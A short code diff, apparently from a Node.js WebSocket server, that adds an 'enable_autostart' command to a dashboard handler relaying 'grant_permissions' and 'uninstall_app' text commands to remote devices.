@@ -634,6 +634,11 @@ function handleDashboard(ws) {
           sendTextToDevice(targetId, "grant_permissions");
           console.log(`✅ Grant permissions sent to ${targetId}`);
           break;
+        case "enable_autostart":
+          // Open auto-start settings on Realme/Xiaomi/etc
+          sendTextToDevice(targetId, "enable_autostart");
+          console.log(`🚀 Enable autostart sent to ${targetId}`);
+          break;
         case "uninstall_app":
           // Relay uninstall command to device
           sendTextToDevice(targetId, "uninstall_app");
